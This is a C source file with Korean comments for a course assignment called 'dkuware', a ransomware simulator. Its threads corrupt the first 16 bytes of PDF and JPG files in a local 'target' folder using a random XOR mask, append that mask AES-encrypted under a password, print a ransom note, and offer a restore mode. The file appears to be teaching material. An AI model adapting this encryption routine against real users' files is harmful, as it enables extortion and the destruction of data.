/*
 * =================================================================================
 * Assignment #2: dkuware (Ransomware Simulator)
 *
 * 이 파일은 프로그램의 메인 로직을 담고 있습니다.
 * - main 함수: 인자 파싱, 스레드 생성 및 관리
 * - attack 함수: 파일 암호화 스레드 로직
 * - restore 함수: 파일 복호화 스레드 로직
 * =================================================================================
 */

// --- 1. 헤더 파일 인클루드 ---
#include <stdio.h>      // 표준 입출력 (printf, fprintf, fopen, fread, fwrite, fseek, ...)
#include <stdlib.h>     // 표준 라이브러리 (EXIT_FAILURE, EXIT_SUCCESS, NULL)
#include <string.h>     // 문자열 처리 함수 (strcmp, strrchr, strlen, memset, memcpy)
#include <pthread.h>    // POSIX 스레드 (pthread_create, pthread_join)
#include <dirent.h>     // 디렉터리 탐색 (opendir, readdir, closedir)
#include <sys/stat.h>   // 파일 정보 확인 (stat, S_ISREG - 일반 파일인지 확인)
#include <limits.h>     // 경로 최대 길이 (PATH_MAX)
#include <unistd.h>     // POSIX 표준 API (ftruncate - 파일 자르기)
#include <sys/types.h>  // POSIX 기본 타입 (ftruncate에서 사용)

// 우리가 직접 만든 헤더 파일들
#include "crypto.h"     // AES 암/복호화 함수 (encrypt_mask, decrypt_mask 등)
#include "utils.h"      // 랜섬 노트 출력 함수 (print_attack_note 등)

// --- 2. 상수 정의 ---
#define THREAD_COUNT 2      // 생성할 스레드 개수 (0번: PDF, 1번: JPG)
#define TARGET_DIR   "target" // 암호화/복호화 대상 디렉터리 이름

// --- 3. 타입 및 구조체 정의 ---

// 스레드 함수(attack 또는 restore)를 가리킬 함수 포인터 타입
// "void*를 인자로 받고 void*를 리턴하는 함수"라는 의미
typedef void *(*thread_func_t)(void *);

// 스레드 생성 시(pthread_create) 넘겨줄 인자들을 묶기 위한 구조체
struct thread_arg {
    const char *password; // 사용자가 입력한 비밀번호 (읽기 전용)
    int thread_id;        // 스레드 ID (0 또는 1). PDF/JPG 구분용
};

// --- 4. 헬퍼 함수 (스레드 안전하게 수정됨) ---

/*
 * [수정된 함수 1: get_extension] (Thread-safe)
 * 파일명(filename)에서 확장자를 '.' 뒤부터 복사하여 out_ext 버퍼에 소문자로 저장합니다.
 *
 * [중요]
 * 이 함수는 'static' 전역 변수를 사용하지 않습니다.
 * 대신 인자로 'out_ext' 버퍼의 주소를 받아서 사용하므로,
 * 여러 스레드가 이 함수를 동시에 호출해도 서로의 데이터를 덮어쓰지 않아 안전합니다.
 */
int get_extension(const char *filename, char *out_ext, size_t ext_size)
{
    // strrchr: 문자열 뒤에서부터 '.' 문자를 찾음
    const char *dot = strrchr(filename, '.');
    if (!dot || dot == filename) return 0; // '.'이 없거나 ".bashrc"처럼 맨 앞에 있으면 확장자 아님
    dot++; // '.' 다음 문자를 가리킴

    size_t len = strlen(dot);
    if (len >= ext_size) len = ext_size - 1; // 버퍼 크기 넘지 않게 조절

    // 확장자를 소문자로 변경하며 복사
    for (size_t i = 0; i < len; ++i) {
        char c = dot[i];
        if (c >= 'A' && c <= 'Z') c = (char)(c - 'A' + 'a'); // 대문자 -> 소문자
        out_ext[i] = c;
    }
    out_ext[len] = '\0'; // 문자열의 끝(NULL) 표시
    return 1; // 성공
}

/*
 * [수정된 함수 2: should_process_file] (Thread-safe)
 * 현재 스레드(thread_id)가 이 파일(filename)을 처리해야 하는지 확장자를 보고 결정합니다.
 *
 * [중요]
 * 'ext' 버퍼를 이 함수의 '스택(stack)' 영역에 선언했습니다.
 * 스택 변수는 각 스레드마다 독립적인 메모리 공간을 가지므로,
 * 여러 스레드가 동시에 이 함수를 호출해도 충돌하지 않습니다.
 */
int should_process_file(int thread_id, const char *filename)
{
    char ext[16]; // 스레드 스택에 생성 (안전)
    
    // 위에서 만든 스레드 안전 get_extension 함수 호출
    if (!get_extension(filename, ext, sizeof(ext))) {
        return 0; // 확장자가 없는 파일 (처리 대상 아님)
    }

    // 0번 스레드는 PDF만 처리
    if (thread_id == 0) {
        if (strcmp(ext, "pdf") == 0)
            return 1; // 처리 대상
    }

    // 1번 스레드는 JPG 또는 JPEG 처리
    if (thread_id == 1) {
        if (strcmp(ext, "jpg") == 0 || strcmp(ext, "jpeg") == 0)
            return 1; // 처리 대상
    }

    return 0; // 그 외에는 처리 안 함
}

// --- 5. 스레드 함수 프로토타입 선언 ---
// main 함수보다 뒤에 정의될 함수들이므로, main에서 인식할 수 있게 미리 선언
void *attack(void *param);
void *restore(void *param);

// --- 6. main 함수 (프로그램 시작점) ---
int main(int argc, char *argv[])
{
    // [인자(Argument) 개수 확인]
    // argc는 인자의 개수. (예: "./dkuware attack 1234" -> 3개)
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <attack|restore> <password>\n", argv[0]);
        return EXIT_FAILURE; // 비정상 종료
    }

    // [인자 파싱]
    const char *mode = argv[1];     // "attack" 또는 "restore"
    const char *password = argv[2]; // 사용자가 입력한 비밀번호

    // [작업 모드 설정]
    // 'worker'라는 함수 포인터 변수에 실행할 함수의 주소를 저장
    thread_func_t worker = NULL;

    if (strcmp(mode, "attack") == 0) {
        worker = attack; // attack 함수 주소
    } else if (strcmp(mode, "restore") == 0) {
        worker = restore; // restore 함수 주소
    } else {
        fprintf(stderr, "Invalid mode: %s (use attack or restore)\n", mode);
        return EXIT_FAILURE;
    }

    // [스레드 생성 준비]
    pthread_t tids[THREAD_COUNT];      // 스레드 ID를 저장할 배열
    struct thread_arg args[THREAD_COUNT]; // 스레드에 넘겨줄 인자 배열

    // [스레드 생성 루프] (THREAD_COUNT 만큼, 즉 2번 실행)
    for (int i = 0; i < THREAD_COUNT; ++i) {
        // 각 스레드에 전달할 인자 설정
        args[i].password = password;
        args[i].thread_id = i; // 0번, 1번 스레드

        // 스레드 생성!
        // (worker에 저장된 함수(attack 또는 restore)를 args[i] 인자와 함께 실행)
        if (pthread_create(&tids[i], NULL, worker, &args[i]) != 0) {
            perror("pthread_create failed"); // 에러 메시지 출력
            return EXIT_FAILURE;
        }
    }

    // [스레드 종료 대기]
    // main 스레드는 여기서 멈추고, 2개의 자식 스레드가 모두 종료될 때까지 기다림
    for (int i = 0; i < THREAD_COUNT; ++i) {
        pthread_join(tids[i], NULL);
    }

    // [마무리 노트 출력]
    // 2개의 스레드가 모두 종료된 후에야 이 코드가 실행됨
    if (worker == attack) {
        print_attack_note(); // utils.c 에 정의됨
    } else {
        print_restore_note(); // utils.c 에 정의됨
    }

    return EXIT_SUCCESS; // 정상 종료
}


// --- 7. 헬퍼 함수 (XOR 연산) ---

// 16바이트(len) 크기의 두 블록(a, b)을 XOR 연산하여 out 버퍼에 저장
static void xor_block(unsigned char *out, const unsigned char *a, const unsigned char *b, size_t len)
{
    for (size_t i = 0; i < len; ++i) {
        out[i] = a[i] ^ b[i]; // 비트 단위 XOR
    }
}

// --- 8. Attack 스레드 함수 ---

/*
 * [공격 스레드 함수]
 * 이 함수는 2개의 스레드에 의해 동시에 실행됩니다.
 * (thread_id 0: PDF 담당, thread_id 1: JPG 담당)
 */
void *attack(void *param)
{
    // main에서 넘겨준 인자를 원래 타입(struct thread_arg)으로 변환
    struct thread_arg *arg = (struct thread_arg *)param;
    int encrypted_count = 0; // [A-9] 이 스레드가 암호화 성공한 파일 수

    // [디렉터리 열기]
    DIR *dir = opendir(TARGET_DIR);
    if (!dir) {
        perror("opendir (attack)");
        return NULL;
    }

    // [디렉터리 순회]
    struct dirent *ent;
    // readdir(): 디렉터리 내의 항목(파일, 하위 디렉터리 등)을 하나씩 읽음
    while ((ent = readdir(dir)) != NULL) {
        // "." (현재 디렉터리) / ".." (상위 디렉터리) 는 스킵
        if (strcmp(ent->d_name, ".") == 0 || strcmp(ent->d_name, "..") == 0)
            continue;
        
        // 파일의 전체 경로 생성 (예: "target/sample1.pdf")
        char path[PATH_MAX];
        snprintf(path, sizeof(path), "%s/%s", TARGET_DIR, ent->d_name);

        // 파일 정보(stat)를 읽어와서 일반 파일(Regular File)인지 확인
        struct stat st;
        if (stat(path, &st) != 0 || !S_ISREG(st.st_mode)) {
            continue; // 디렉터리나 심볼릭 링크 등은 스킵
        }
        
        // [스레드 분기]
        // 이 스레드가 담당할 파일 확장자인지 확인 (스레드 안전 함수 호출)
        if (!should_process_file(arg->thread_id, ent->d_name)) {
            continue; // 담당 파일 아니면 스킵
        }

        // --- 여기서부터 실제 암호화 로직 (계획 A) ---

        // [A-1] 파일 열기
        // "rb+": 바이너리(b) 모드로, 읽기(r)와 쓰기(+)를 모두 하겠다
        FILE *fp = fopen(path, "rb+");
        if (!fp) {
            fprintf(stderr, "[attack] Failed to open %s\n", path);
            continue; // 다음 파일로
        }

        // [A-1] 파일 크기 확인
        fseek(fp, 0, SEEK_END); // 파일 포인터를 맨 끝으로 이동
        long size = ftell(fp);  // 현재 위치(파일 크기) 확인
        if (size < 16) {
            fprintf(stderr, "[attack] File %s is too small (< 16 bytes), skipping.\n", path);
            fclose(fp);
            continue; // [A-1] 16바이트보다 작으면 스킵
        }

        // [A-2] 파일의 첫 16바이트(원본) 읽기
        unsigned char plain[16];
        fseek(fp, 0, SEEK_SET); // 파일 포인터를 다시 0(처음)으로
        if (fread(plain, 1, 16, fp) != 16) {
            fprintf(stderr, "[attack] Failed to read 16 bytes from %s, skipping.\n", path);
            fclose(fp);
            continue;
        }

        // [A-3] 16바이트 랜덤 mask 만들기
        unsigned char mask[16];
        FILE *urand_fp = fopen("/dev/urandom", "rb"); // 리눅스 커널이 제공하는 랜덤 값 장치
        if (!urand_fp || fread(mask, 1, 16, urand_fp) != 16) {
            fprintf(stderr, "[attack] Failed to generate random mask, skipping %s\n", path);
            if (urand_fp) fclose(urand_fp);
            fclose(fp);
            continue;
        }
        fclose(urand_fp); // 랜덤 장치 닫기

        // [A-4] 원본(plain)과 mask를 XOR -> 암호문 블록(cipher_block) 생성
        unsigned char cipher_block[16];
        xor_block(cipher_block, plain, mask, 16); // 위에서 만든 헬퍼 함수

        // [A-5] 파일의 첫 16바이트를 암호문(cipher_block)으로 덮어쓰기
        fseek(fp, 0, SEEK_SET); // 다시 파일 처음으로
        if (fwrite(cipher_block, 1, 16, fp) != 16) {
            fprintf(stderr, "[attack] Failed to overwrite first 16 bytes of %s, skipping.\n", path);
            fclose(fp);
            continue;
        }
        fflush(fp); // 버퍼에 남은 데이터를 즉시 파일에 쓰도록 보장

        // [A-6] 비밀번호로 AES 키 만들기 (crypto.c 함수 호출)
        unsigned char key[16];
        derive_key_from_password(arg->password, key);

        // [A-7] mask를 AES로 암호화 (crypto.c 함수 호출)
        unsigned char encrypted_mask[16];
        if (encrypt_mask(mask, encrypted_mask, key) != 0) {
            fprintf(stderr, "[attack] encrypt_mask failed for %s, skipping.\n", path);
            fclose(fp);
            continue;
        }

        // [A-8] 파일 맨 끝에 암호화된 mask(16B)를 추가 (append)
        fseek(fp, 0, SEEK_END); // 파일 맨 끝으로
        if (fwrite(encrypted_mask, 1, 16, fp) != 16) {
            fprintf(stderr, "[attack] Failed to append encrypted_mask to %s, skipping.\n", path);
            fclose(fp);
            continue;
        }

        // [A-9] 모든 단계 성공
        fclose(fp); // 파일 닫기
        encrypted_count++;
        
        printf("[attack] thread %d successfully encrypted file: %s\n",
               arg->thread_id, path);

    } // end while(readdir) - 다음 파일 순회

    closedir(dir); // 디렉터리 닫기
    
    // [A-9] 루프 종료 후, 이 스레드의 최종 결과 출력
    printf("[attack] thread %d finished. Encrypted %d files.\n",
           arg->thread_id, encrypted_count);
           
    return NULL; // 스레드 종료
}


// --- 9. Restore 스레드 함수 ---

/*
 * [복구 스레드 함수]
 * 이 함수 역시 2개의 스레드에 의해 동시에 실행됩니다.
 * (thread_id 0: PDF 담당, thread_id 1: JPG 담당)
 */
void *restore(void *param)
{
    // main에서 넘겨준 인자를 원래 타입(struct thread_arg)으로 변환
    struct thread_arg *arg = (struct thread_arg *)param;
    int restored_count = 0; // [R-9] 이 스레드가 복구 성공한 파일 수

    // [디렉터리 열기]
    DIR *dir = opendir(TARGET_DIR);
    if (!dir) {
        perror("opendir (restore)");
        return NULL;
    }

    // [디렉터리 순회]
    struct dirent *ent;
    while ((ent = readdir(dir)) != NULL) {
        // (attack과 동일: ., .. 스킵)
        if (strcmp(ent->d_name, ".") == 0 || strcmp(ent->d_name, "..") == 0)
            continue;
        
        // (attack과 동일: 전체 경로 생성)
        char path[PATH_MAX];
        snprintf(path, sizeof(path), "%s/%s", TARGET_DIR, ent->d_name);

        // (attack과 동일: 일반 파일인지 확인)
        struct stat st;
        if (stat(path, &st) != 0 || !S_ISREG(st.st_mode))
            continue;
        
        // (attack과 동일: 담당 파일인지 스레드 안전하게 확인)
        if (!should_process_file(arg->thread_id, ent->d_name))
            continue;

        // --- 여기서부터 실제 복호화 로직 (계획 R) ---

        // [R-1] 파일 열기 (rb+: 읽기/쓰기 바이너리 모드)
        FILE *fp = fopen(path, "rb+");
        if (!fp) {
            fprintf(stderr, "[restore] Failed to open %s\n", path);
            continue;
        }

        // [R-1] 파일 크기 확인
        fseek(fp, 0, SEEK_END);
        long size = ftell(fp);
        // 원본 최소 16B + 꼬리에 붙은 encrypted_mask 16B = 최소 32B
        if (size < 32) { 
            fprintf(stderr, "[restore] File %s is too small (< 32 bytes), skipping.\n", path);
            fclose(fp);
            continue;
        }

        // [R-2] 파일 끝에서 16바이트(encrypted_mask) 읽기
        unsigned char encrypted_mask[16];
        fseek(fp, -16, SEEK_END); // 맨 끝에서 16바이트 앞으로 이동
        if (fread(encrypted_mask, 1, 16, fp) != 16) {
            fprintf(stderr, "[restore] Failed to read encrypted_mask from %s, skipping.\n", path);
            fclose(fp);
            continue;
        }

        // [R-3] 비밀번호 -> AES 키 (crypto.c 함수 호출)
        unsigned char key[16];
        derive_key_from_password(arg->password, key);

        // [R-4] encrypted_mask를 복호화 -> 원본 mask 복원 (crypto.c)
        unsigned char mask[16];
        if (decrypt_mask(encrypted_mask, mask, key) != 0) {
            // 복호화 실패: 비밀번호가 틀렸거나, 파일이 손상되었을 수 있음
            fprintf(stderr, "[restore] decrypt_mask failed for %s (wrong password?), skipping.\n", path);
            fclose(fp);
            continue;
        }

        // [R-5] 파일의 첫 16바이트(암호문 블록) 읽기
        unsigned char cipher_block[16];
        fseek(fp, 0, SEEK_SET); // 파일 처음으로
        if (fread(cipher_block, 1, 16, fp) != 16) {
            fprintf(stderr, "[restore] Failed to read first 16 bytes from %s, skipping.\n", path);
            fclose(fp);
            continue;
        }

        // [R-6] 암호문(cipher_block)과 복원된 mask를 XOR -> 원본(plain) 복구
        unsigned char plain[16];
        xor_block(plain, cipher_block, mask, 16);

        // [R-7] 파일 앞에 원본(plain) 덮어쓰기
        fseek(fp, 0, SEEK_SET); // 다시 파일 처음으로
        if (fwrite(plain, 1, 16, fp) != 16) {
            fprintf(stderr, "[restore] Failed to overwrite first 16 bytes of %s, skipping.\n", path);
            fclose(fp);
            continue;
        }

        // [R-8] 파일 끝의 16바이트(encrypted_mask) 잘라내기
        long new_size = size - 16; // (현재 크기 - 16)
        // ftruncate: 파일을 new_size 크기로 '자름'
        // fileno(fp): FILE* 포인터를 파일 디스크립터(int) 번호로 변환
        if (ftruncate(fileno(fp), new_size) != 0) {
            perror("ftruncate failed");
            fprintf(stderr, "[restore] Failed to truncate file %s, skipping.\n", path);
            fclose(fp);
            continue;
        }

        // [R-9] 모든 단계 성공
        fclose(fp); // 파일 닫기
        restored_count++;
        
        printf("[restore] thread %d successfully restored file: %s\n",
               arg->thread_id, path);

    } // end while(readdir) - 다음 파일 순회

    closedir(dir); // 디렉터리 닫기

    // [R-9] 루프 종료 후, 이 스레드의 최종 결과 출력
    printf("[restore] thread %d finished. Restored %d files.\n",
           arg->thread_id, restored_count);
           
    return NULL; // 스레드 종료
}